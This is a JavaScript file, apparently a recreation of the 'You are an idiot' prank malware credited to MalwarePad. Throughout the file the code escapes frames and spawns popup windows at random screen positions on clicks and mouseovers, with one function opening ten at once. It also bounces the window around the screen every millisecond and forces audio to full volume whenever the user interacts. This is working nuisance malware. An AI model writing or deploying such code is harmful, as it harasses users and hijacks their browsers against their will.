/* 
    * Written by MalwarePad https://malwarepad.com
*/

if (top.location != location) {
  top.location.href = location.href;
}
function reopen() {
  var popupWidth = 350;
  var popupHeight = 370;
  var left = Math.floor(Math.random() * Math.max(1, screen.width - popupWidth));
  var topPosition = Math.floor(
    Math.random() * Math.max(1, screen.height - popupHeight)
  );
  window.open(
    "popup.html",
    "",
    "blankmenubar=no,status=no,toolbar=noresizable=no,width=" +
      popupWidth +
      ",height=" +
      popupHeight +
      ",left=" +
      left +
      ",top=" +
      topPosition +
      ",titlebar=no,alwaysRaised=yes"
  );
}
function randomOffset() {
  return (Math.floor(Math.random() * 7) + 1) * (Math.random() < 0.5 ? -5 : 5);
}
function spam() {
  for (var i = 0; i < 10; i++) {
    reopen();
  }
  return "You are an idiot!";
}
var audioRetryTimer = null;
function playAudio(audio) {
  if (!audio) return;
  var p = audio.play();
  if (p && typeof p.catch === "function") {
    p.catch(function () {
      if (audioRetryTimer) return;
      audioRetryTimer = setTimeout(function () {
        audioRetryTimer = null;
        if (audio.readyState === 0) {
          audio.load();
        }
        audio.play().catch(function () {});
      }, 150);
    });
  }
}
function boostAudio() {
  var audio = document.getElementById("idiot-audio");
  if (!audio) return;
  audio.muted = false;
  audio.volume = 1.0;
  playAudio(audio);
}
function init() {
  document.body.onclick = function () {
    reopen();
    boostAudio();
  };
  document.body.onmouseover = function () {
    reopen();
    boostAudio();
  };
  document.body.onmousemove = function () {
    boostAudio();
  };
  document.body.onpointerdown = function () {
    boostAudio();
  };
  document.body.onkeydown = function () {
    boostAudio();
  };
  playBall();
  if (typeof window.bookmark === "function") {
    window.bookmark();
  }
  reopen();
}
var xOff = randomOffset(),
  yOff = randomOffset(),
  xPos = Math.floor(Math.random() * Math.max(1, screen.width - 175)),
  yPos = Math.floor(Math.random() * Math.max(1, screen.height - 100)),
  flagRun = true;
function newXlt() {
  xOff = Math.ceil(0 - 6 * Math.random()) * 5 - 10;
  window.focus();
}
function newXrt() {
  xOff = Math.ceil(7 * Math.random()) * 5 - 10;
}
function newYup() {
  yOff = Math.ceil(0 - 6 * Math.random()) * 5 - 10;
}
function newYdn() {
  yOff = Math.ceil(7 * Math.random()) * 5 - 10;
}
function fOff() {
  flagrun = false;
}
function playBall() {
  xPos += xOff;
  yPos += yOff;
  if (xPos > screen.width - 175) {
    newXlt();
  }
  if (xPos < 0) {
    newXrt();
  }
  if (yPos > screen.height - 100) {
    newYup();
  }
  if (yPos < 0) {
    newYdn();
  }
  if (flagRun) {
    window.moveTo(xPos, yPos);
    setTimeout(playBall, 1);
  }
}
